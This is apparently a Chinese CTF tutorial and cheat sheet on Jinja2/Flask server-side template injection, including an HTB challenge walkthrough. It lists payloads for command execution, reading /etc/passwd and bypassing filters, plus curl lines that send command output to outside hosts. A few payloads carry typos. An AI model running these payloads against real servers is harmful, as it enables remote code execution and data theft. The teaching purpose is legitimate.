三、注入流程以及必要函数的用法 变量块 {{}}\t用于将表达式打印到模板输出 注释块 {##}\t注释 控制块\t{%%}\t可以声明变量，也可以执行语句 行声明\t## 可以有和{%%}相同的效果 __class__ 类的一个内置属性，表示实例对象的类。 __base__ 类型对象的直接基类 __bases__ 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__ __mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。 __subclasses__() 返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order. __init__ 初始化类，返回的类型是function __globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。 __dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里 __getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。 __getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b') __builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。 __import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()] __str__() 返回描写这个对象的字符串，可以理解成就是打印出来。 url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。 get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。 lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}} current_app 应用上下文，一个全局变量。 request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read() request.args.x1 get传参 request.values.x1 所有参数 request.cookies cookies参数 request.headers 请求头参数 request.form.x1 post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data) request.data post传参\t(Content-Type:a/b) request.json post传json (Content-Type: application/json) config 当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read() }} g {{g}}得到&lt;flask.g of 'flask_ssti'&gt; int() 将值转换为int类型； float() 将值转换为float类型； lower() 将字符串转换为小写； upper() 将字符串转换为大写； title() 把值中的每个单词的首字母都转成大写； capitalize()\t把变量值的首字母转成大写，其余字母转小写； trim() 截取字符串前面和后面的空白字符； wordcount()\t计算一个长字符串中单词的个数； reverse()\t字符串反转； replace(value,old,new)\t替换将old替换为new的字符串； truncate(value,length=255,killwords=False)\t截取length长度的字符串； striptags()\t删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格； escape()或e\t转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。 safe() 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}； list() 将变量列成列表； string()\t将变量转换成字符串； join() 将一个序列中的参数值拼接成字符串。示例看上面payload； abs() 返回一个数值的绝对值； first() 返回一个序列的第一个元素； last() 返回一个序列的最后一个元素； format(value,arags,*kwargs)\t格式化字符串。比如：{{\"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo! length()\t返回一个序列或者字典的长度； sum() 返回列表内数值的和； sort() 返回排序后的列表； default(value,default_value,boolean=false)\t如果当前变量没有值，则会使用参数中的值来代替。示例： name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。 length()\t返回字符串的长度，别名是count 2.1. 初识SSTI 1. 什么是SSTI？ SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。 可能SSTI对大家而言不是很熟悉，但是相信大家很熟悉SQL注入。实际上这两者的思路都是相同的，因此可以类比来分析。 2. render_template渲染函数是什么 就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。 3. 注入的思想 用函数不断调用我们要使用的命令：file、read、open、ls等等命令，我们用这些来读取写入配置文件； 4. 什么是模板引擎 是为了使 用户界面和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中，然后反馈给浏览器，呈现在用户面前 当前的主流框架，一般都采用MVC模式，即：Model-View-Controller，用户的输入先进入Controller控制器，然后根据清流类型和请求的指令发送给对应的Model业务模型，由Model层进行业务逻辑的判断、数据库的存取等，最后把结果返回给View视图层，再经模板引擎的渲染展示给用户 模板引擎的基本机理就是替换（转换）：将指定的标签转换为需要的业务数据；将指定的伪语句按照某种流程来变换输出 引用一段代码来简单说一下： // 模板 var template = '&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;'; // 用于匹配的正则 /* 用于过滤出以&lt;%开头，%&gt;结尾，并且中间不包含%或&gt;的匹配项 其目的在于过滤出template中的 &lt;%name%&gt; 和 &lt;%age%&gt; */ var regex = /&lt;%([^%]+)?%&gt;/g; // 数据 var data = { name:'Deutsh', age:22 } // 模板引擎 var TemplateEngine = function (template,data) { // exec使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式 // /regex/.exec()仅返回找到的第一个匹配项 while (match = regex.exec(template)) { template = template.replace(match[0],data[match[1]]) } return template; } // 最终的执行在此处 var string = TemplateEngine(template,data) console.log(string) 上述代码，我们的目的是：将数据文件中对应的name和age替换到模板文件中 主要的执行在模板引擎的while函数中，match = regex.exec(template)会返回一个array，这个数组中包含了多个项目 ⚠️ 为什么会包含两项呢：当正则表达式设置 g 标志位时，可以多次执行 exec 方法来查找同一个字符串中的成功匹配 之后template = template.replace(match[0],data[match[1]])等同于template = template.replace(\"&lt;%name%&gt;\",data[\"name\"])完成模板中数据的替换 5. 引发SSTI的真正原因 render_template渲染函数的问题 渲染函数在渲染的时候，往往对用户输入的变量不做渲染。 也就是说例如：`{{}}`在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换。比如`{{1+1}}`会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。 还比如说 由前面模板代码安利的演示，我们可以发现，若服务端接受了用户的输入后（比如对于上述案例，data的name和age的数据由数据的输入/提交/请求而得），未经任何处理就将其作为Web应用模板内容的一部分，就会导致模板引擎在进行目标编译渲染的过程中，执行了用户插入的可执行语句，从而可能导致信息泄露、代码执行等问题 凡是使用模板的地方，SSTI是绕不过的问题，模板引擎可由多种语言实现，所以SSTI也就出现在了多种语言环境中 模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。 6. route装饰器路由 @app.route('/') 使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如 @app.route('/') def test()\" return 123 访问127.0.0.1:5000/则会输出123，我们修改一下规则 这个时候访问127.0.0.1:5000/test会输出123. 此外还可以设置动态网址， @app.route(\"/hello/&lt;username&gt;\") def hello_user(username): return \"user:%s\"%username 根据url里的输入，动态辨别身份，此时便可以看到如下页面： 或者可以使用int型，转换器有下面几种： int 接受整数 float 同 int ，但是接受浮点数 path 和默认的相似，但也接受斜线 @app.route('/post/&lt;int:post_id&gt;') def show_post(post_id): # show the post with the given id, the id is an integer return 'Post %d' % post_id 7. main入口 ​ 当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。 if __name__ == '__main__': app.debug = True app.run() 测试的时候，我们可以使用debug，方便调试，增加一句 app.debug = True 或者（效果是一样的） app.run(debug=True) 这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。 app.run(host='0.0.0.0') 这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。 8. 模板渲染（重点） 你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例: 简单的模版渲染示例 from flask import render_template @app.route('/hello/') @app.route('/hello/&lt;name&gt;') def hello(name=None): return render_template('hello.html', name=name)//我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看 我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。 首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。 ├── app.py ├── static │ └── style.css └── templates └── index.html 我们写一个index.html文件写templates文件夹中。 &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 里面有两个参数需要我们渲染，user.name，以及title 我们在app.py文件里进行渲染。 @app.route('/') @app.route('/index')#我们访问/或者/index都会跳转 def index(): user = {'name': '小猪佩奇'}#传入一个字典数组 return render_template(\"index.html\",title='Home',user=user) Image这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。 2.2. 判断SSTI类型 上面提到网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型？ 广为流传的就是这张图了，根据处理返回值的不同来进行判别。（注意括号的数量等） 1. 常见的模板引擎 PHP Twig模板变量：{{%s}} Smarty模板变量：{%s} Blade模板变量：{{%s}} Python Jinja2模板变量：{{%s}} Tornado模板变量：{{%s}} Django模板变量：{{ }} Java FreeMarker模板变量：&lt;#%s&gt;``${%s} Velocity模板变量：#set($x=1+1)${x} 模板引擎众多，各个模板引擎的语法也不尽相同，我们最主要的是能定位出是否存在SSTI漏洞，至于后续的利用，我们掌握一些，其余的见到再查即可 Jinja2 Jinja2 是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。 Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 {{…}} 块。 Jinja2 模板同样支持控制语句，像在 {%…%} 块中。 控制结构 {% %} 可以声明变量，也可以执行语句 变量取值 {{ }} 用于将表达式打印到模板输出 注释块 {# #} 用于注释 2. 如何测试是否存在SSTI 简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI 此处我们拿来bmjoker师傅提供的一段示例代码 Twig模板引擎示例代码 &lt;?php require_once dirname(__FILE__).'\\twig\\lib\\Twig\\Autoloader.php'; Twig_Autoloader::register(true); // Twig_Loader_Array 用于定位模板 内置的加载器 // Twig_Environment 来存储配置信息 内置的环境变量 $twig = new Twig_Environment(new Twig_Loader_String()); // render() 方法通过其第一个参数载入模板，**并通过第二个参数中的变量来渲染模板**！！重要！！ // 模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET[\"name\"] $output = $twig-&gt;render(\"Hello {{name}}\", array(\"name\" =&gt; $_GET[\"name\"])); // 将用户输入作为模版变量的值 echo $output; ?&gt; 这段代码中，由于模板引擎一般都会默认对渲染的变量值进行编码和转义。所以一般情况下并不会存在XSS等攻击的可能 若就如我们最开始的例子所说，若模板引擎渲染的内容受我们控制了，就不一定了 // 上述代码基本内容不变，$output后的内容发生变化 $output=$twig-&gt;render(\"Hello {$_GET['name']}\");// 将用户输入作为模版内容的一部分 此时render函数由于缺少第二个参数，所以直接就会把\"Hello 用户的输入\"拼如模板进行渲染,这就相当于改变了最初的模板，由于模板最初是由开发者定义的，所以他会受到“信任” 对于Twig模板的变量`{{%s}}`除了传递变量外，还可以执行表达式，最简单的表达式就是{{2*2}}，这也是辨认是否存在SSTI最基本的指纹，若我们输入{{2*2}}，HTML页面返回其其结果4，就说明该表达式被解析，存在SSTI 3. 靶场实战 HTB-Templated 题目直接提示我们本体使用的模板引擎为**Jinja2**，根据我们之前总结的各个模板引擎的变量类型，我们可以知道该变量的类型是 **{{%s}}**，所以话不多说我们直接拼接尝试 payload={{2 * 2}} 2*2被计算，确认存在SSTI模板注入 exp 本题的重点还是在利用方面：由于我们的目标是读取处于服务器本地的一个存有Flag的文件，所以我们的重点是找到一个含有某种读取文件的函数的类（Python中），我们通过查阅手册发现可以利用Popen函数完成该功能，调用该函数会返回一个文件的句柄，然后再配合read()函数读取即可 该函数会执行fork一个子进程执行command这个命令，同时将子进程的标准输出通过管道连接到父进程，对于文件在父进程调用read()读取即可，对于命令在父进程会被执行 那么下面的重点就是，如何找到Popen这个函数所属的类，一般有两种方法，我们先说第一种 由于我们想要找的是一个子类，所以第一步即使找到其对象基类 即class 'object'，为了达到这步，我们可以使用__mro__属性来访问对象的继承类，但我们目前没有对象，所以这里我们就构造一个空字符串: `{{\"\".__class__.__mro__}}`其中`__class__`用于返回调用的参数类型 可以看出该子类继承自class'str'与class 'object'并以一个元组返回，我们通过索引获得对象类 {{\"\".__class__.__mro__[1]}} 接下来，我们要列举出所有集成自object的子类，通过对该对象调用__subclasses__方法 {{\"\".__class__.__mro__[1].__subclasses__()}} 但这有一个明显的缺点就是，好家伙，这么多子类，怎么可能找得到，为了缩小范围我们对其进行切片 `{{\"\".__class__.__mro__[1].__subclasses__()[400:]}}`查找400个以后的元素 成功定位其位置，处于滴414号位置 {{\"\".__class__.__mro__[1].__subclasses__()[414]}} 然后我们为该函数传递参数调用即可 {{\"\".__class__.__mro__[1].__subclasses__()[414](\"ls\",shell=True,stdout=-1).communicate()}} 查看本地文件，发现flag.txt Popen.communicate() 与进程交互：将数据发送到标准输入。从 stdout 和 stderr 读取数据，直到到达文件结尾 之后我们直接cat他就看见啦~~~~ {{\"\".__class__.__mro__[1].__subclasses__()[414](\"cat flag.txt\",shell=True,stdout=-1).communicate()}} 剩下的未实操过 exp2 这里我们还有一种方法，使用全局下的内置模块引用__builtins__（指向__builtin__） 在Python中，有一个内建模块，该模块中有一些常用函数;而该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存 {{\"\".__class__.__bases__[0].__subclasses__()[1500].__init__.__globals__['__builtins__']['__import__'](\"os\").popen(\"cat flag.txt\").read()}} 同样，我们获取基本类后，继续向下获取基本类(object)的子类，然后init初始化类，globals全局来查找所有的方法及变量和参数并查看其内建模块的引用 使用内建模块中的__import__引入os库，并适用其中的popen函数读取flag.txt即可 注意： 该exp中，对子类的选择subclasses()[1500]时，经测试大多数子类中都包含内建模块的引用，但依旧有不少不包含，要注意 我们使用burp将子类的选择加为参数进行爆破 遍历出（以下截图中Payload的子类号都可以引用，具有**__builtins__**） 以下为不可以使用的（由此可看出号往大了写就对了~） 4. SSTI利用思路 先上Payload： {{''.__class__.__base__.__subclasses__()[1].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}} 下面分步对每一步代码进行分析： 1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。 {{''.__class__}} # &lt;class 'str'&gt; {{().__class__}} # &lt;type 'tuple'&gt; {{[].__class__}} # &lt;type 'list'&gt; {{{}.__class__}} # &lt;type 'dict'&gt; 2.下一步目的是拿到object基类。 {{''.__class__.__base__}} # &lt;class 'object'&gt; 3.然后获取对应子类。 {{''.__class__.__base__.__subclasses__()}} # [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, ... 4.在所有的子类中选择一个可用的类，去获取__globals__全局变量。如果这些函数并没有被重载，这时他们并不是function，不具有__globals__属性。 {{''.__class__.__base__.__subclasses__()[128]}} # &lt;class 'os._wrap_close'&gt; 5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量。 {{''.__class__.__base__.__subclasses__()[128].__init__}} # &lt;function _wrap_close.__init__ at 0x00000221629F5048&gt; {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__}} # ..., 'eval': &lt;built-in function eval&gt;, ... 6.再获取到__globals__全局变量里的__builtins__中的eval函数。 {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']}} # {'__name__': 'builtins', '__doc__': ... {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']}} # &lt;built-in function eval&gt; 7.使用popen命令执行即可。 {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')}} # root 2.3 常用类 先举几个基础的例子方便理解： 1、class __class__用来查看变量所属的类，格式为变量.class &gt;&gt;&gt; ''.__class__ &lt;class 'str'&gt; &gt;&gt;&gt; ().__class__ &lt;class 'tuple'&gt; &gt;&gt;&gt; {}.__class__ &lt;class 'dict'&gt; &gt;&gt;&gt; [].__class__ &lt;class 'list'&gt; 2、bases __bases__用来查看类的基类，注意是类的基类，所以格式为变量.class.bases &gt;&gt;&gt; ''.__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; ().__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; {}.__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; [].__class__.__bases__ (&lt;class 'object'&gt;,) 同时也能加上数组，比如变量.class.bases[0]来获得第一个基类。 值得一提的是还有个类是__mro__，它会显示类和基类，这是它和__bases__的不同。 &gt;&gt;&gt; ''.__class__.__mro__ (&lt;class 'str'&gt;, &lt;class 'object'&gt;) 3、subclasses() subclasses()查看当前类的子类，格式变量.class.bases[0].subclasses() 这个类也可以加数组来查看指定的索引值，例如变量.class.bases[0].subclasses()[1] &gt;&gt;&gt; ''.__class__.__bases__[0].__subclasses__()[0] &lt;class 'type'&gt; 这个时候就可以开始利用类里面的方法了。 例如: 变量.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__ init初始化类，然后globals全局来查找所有的方法及变量及参数。 由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用： ''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read() 大概是这么个原理，但这样说来还是不知道怎么利用，来看几道题就能更深刻理解了。 之后的题目参考：https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506 魔术对象 __class__ :返回类型所属的对象 __mro__ :返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ \"返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 __subclasses__ 获取当前类的所有子类 __init__ 类的初始化方法 __globals__ 对包含(保存)函数全局变量的字典的引用 用魔术对象构造一个简单的语句 我们在里面运行以下： &gt;&gt;&gt; [].__class__ &lt;class 'list'&gt; &gt;&gt;&gt; [].__class__.__base__ &lt;class 'object'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__() &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2] &lt;class 'weakcallableproxy'&gt; &gt;&gt;&gt; 解读一下： class返回[]所属的对象； class+base:返回这个对象所继承的基类 class+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类这就是一个具有[]的对象继承的基类的所有子类，在这里面我们不乏可以找到我们要用的子类如前文所提到的：file、open等等。 那么既然我们要用SSTI去做些事情，那么我们就要用到这些子类呗。 如何调用这些子类： &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2] &lt;class 'weakcallableproxy'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[3] &lt;class 'weakproxy'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40] &lt;class 'wrapper_descriptor'&gt; 这样我们就可以调用这些子类了 假如我们要去查看某个网页获取flag，那么我们用file函数：(file 在PT2里面还可以使用，在PY3里面已经被移除了) [].__class__.__base__.__subclasses__()[40]('fl4g').read() 但是如果我们想要去获取目录等等，就需要用到system函数：读取目录一般是ls函数，那么我们来看看如何调用 !/usr/bin/env python encoding: utf-8 num = 0 for item in ''.__class__.__mro__[2].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 得到类中OS模块的函数(71) ().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls') (os.listdir()：列出第一层目录文件 因为71是os库的函数，所以globals是对该函数字典的引用，所以我们这下就拿到了字典，然后紧接着就是我们要使用的命令。) 有时候system函数会被过滤掉，我们就使用 ().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.') #读取本级目录 dir()与__dict__ dir()是一个函数，返回的是list； __dict__是一个字典，键为属性名，值为属性值； dir()返回所有的属性，而__dict__返回的是非父类的键与对应的值。 2.4 常见的playload 获得基类 #python2.7 ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] #python3.7 ''.__。。。class__.__mro__[1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] #python 2.7 #文件操作 #找到file类 [].__class__.__bases__[0].__subclasses__()[40] #读文件 [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read() #写文件 [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test') #命令执行 #os执行 [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令： [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() #eval,impoer等全局函数 [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令： [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read() [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() #python3.7 #命令执行 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %} #文件操作 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %} #windows下的os命令 \"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() 2.5 常见的命令执行方式 os.system() …init__globals[‘os’].system(‘ls’)的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回0，失败返回-1，因为输出结果不明显，所以我们也会用到下面这个命令： os.popen() 用法：os.popen(command[,mode[,bufsize]]) eg:{{().class.base.subclass__()[71].init.globlas__[‘os’].popen(‘ls’,‘r’).read()}} 说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。 init.globals__[‘os’].popen(‘ls’,‘r’),read() popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。 缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息 warnings.catchwarning 访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。 于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试） [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls') [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls') values 作用：返回字典中的所有值。 使用： #!/usr/bin/python dict = {'Name': 'Zara', 'Age': 7} print \"Value : %s\" % dict.values() 以上实例输出结果为： Value : [7, 'Zara'] __builtins__内建函数 内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多我们需要的eval函数，可以执行命令,但是经常会被ban 当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。 内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。 `__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。 __globals__：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。 __import__()：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 __import__() 来动态载入，就是 import。语法：__import__(模块名) 这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的： ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()') ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()') 这两个payload用的是同一个模块,__builtins__模块,eval方法. [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('ls').read() 绕过 拼接 object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') ().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read() 编码 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval'](\"__import__('os').popen('ls').read()\") 等价于 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](\"X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=\".decode('base64'))(可以看出单双引号内的都可以编码) 同理还可以进行rot13、16进制编码等 过滤中括号[] getitem() \"\".__class__.__mro__[2] \"\".__class__.__mro__.__getitem__(2) pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40) ('/etc/passwd').read() 若.也被过滤，使用原生JinJa2函数|attr() 将request.__class__改成request|attr(\"__class__\") 字典读取 __builtins__['eval']() __builtins__.eval() 经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行 过滤双下划线__ {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 将其中的 request.args 改为 request.values 则利用post的方式进行传参 GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40] ('/etc/passwd').read() }} POST: class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤花括号 {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %} 或者： {% if ''.__class__.__mro__[2].__subclasses__() [59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / | grep flag`;') %}1{% endif %} 如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来 {% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %} 过滤引号 request.args 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传值进来,进而绕过了引号的过滤 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40) (request.args.path).read()}}&amp;path=/etc/passw 过滤了单双引号和中括号 request.cookies仍然可以用 单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过拿点绕过，拿 getitem 等绕过都可 以。 使用request绕过的话可以这样： ?name={{url_for.__globals__.os.popen(request.cookies.c).read()}} Cookie:c=cat /flag 过滤关键字 base64编码绕过 getattribute 使用实例访问属性时,调用该方法 例如被过滤掉 class 关键词 {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__() [40](\"/etc/passwd\").read()}} 字符串拼接绕过 {{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40] (\"/etc/passwd\").read()}} 过滤 _ 利用request.args属性 {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40] ('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 将其中的request.args改为request.values则利用post的方式进行传参 过滤os ?name= {{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c). read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag 过滤args ?name={{url_for.__globals__[request.cookies.a][request.cookies.b] 